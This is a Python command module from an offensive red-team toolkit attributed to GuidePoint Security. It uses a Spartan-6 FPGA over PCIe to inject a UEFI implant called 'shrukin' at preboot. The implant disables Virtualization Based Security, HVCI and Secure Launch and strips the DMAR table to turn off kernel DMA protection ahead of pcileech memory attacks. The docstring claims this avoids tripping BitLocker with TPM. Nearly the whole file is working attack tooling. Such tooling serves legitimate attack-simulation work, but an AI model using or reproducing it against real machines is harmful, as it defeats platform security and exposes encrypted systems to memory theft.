#
# PREBOOT
# 
# GuidePoint Security LLC
#
# Threat and Attack Simulation Team
#
import os
import click
import struct
import logging
import colorama
import click_params

from lib import helper
from lib import logger
from lib import static
from lib import pcie_lib_helper

PROG_NONE = 0
PROG_VBS_DISABLE = 1
PROG_DMA_ENABLED = 2

@click.command( name = 'shrukin', short_help = 'Loads "shrukin" to prep the host for pcileech.', no_args_is_help = True )
@click.option( '--host', required = True, help = 'IPv4 address of the Spartan-6 SP605.', type = click_params.IPV4_ADDRESS )
@click.option( '--port', help = 'Port of the Spartan-6 SP605', type = int, default = static.DEFAULT_PORT_SP605, show_default = True )
@click.option( '--sys-table-address', help = 'Address of the EFI_SYSTEM_TABLE', type = helper.click_hex_int, required = True )
@click.option( '--debug', help = 'Enable debug output.', default = False, is_flag = True )
def shrukin( host, port, sys_table_address, debug ):
    """
    Injects "shrukin" a UEFI implant that will disable the creation of Virtualization Based Security,
    Hypervisor Code Integrity and Secure Launch as well as clean the DMAR ACPI table so that it does
    not use Kernel DMA.

    It should not trip a Bitlocker + TPM setup as it does not raise a PCR measurement failure in my
    testing.
    """
    # Initializze the logger
    logger.init_log( debug )

    if not os.path.isfile( './source/stage_1_shrukin/stage_1_shrukin.x64.bin' ):
        logging.error( 'stage_1_shrukin has not been compiled.' )
        return
    else:
        # read the file into the buffer
        stage_1_f = open( './source/stage_1_shrukin/stage_1_shrukin.x64.bin', 'rb+' )
        stage_1_c = stage_1_f.read()
        stage_1_f.close()

    # wait until we are linked properly
    dev = pcie_lib_helper.wait_for_endpoint_init( ( str( host ), port ), retry_timeout = 0.01 )

    if dev != None:
        # inject a stager and stage the shrukin agent over it
        status_code = pcie_lib_helper.inject_efi_staged( dev, sys_table_address, stage_1_c, retry_wait = 0.01 );

        # parse the status code
        if status_code != None:
            if status_code == PROG_NONE:
                # complete and utter failure
                logging.error( 'Failed to disable anything.' )
            elif status_code == PROG_VBS_DISABLE:
                # may be good, may not be? Depends on whether IOMMU is enabled
                logging.info( 'Disabled VBS/HVCI/SL but could failed to remove kernel DMA.' );
            elif status_code == PROG_DMA_ENABLED:
                # success! no issues at all with this setup!
                logging.info( 'Disabled VBS/HVCI/SL as well as kernel DMA.' )
    else:
        logging.error( 'Could not initialize the PCIe device.' );
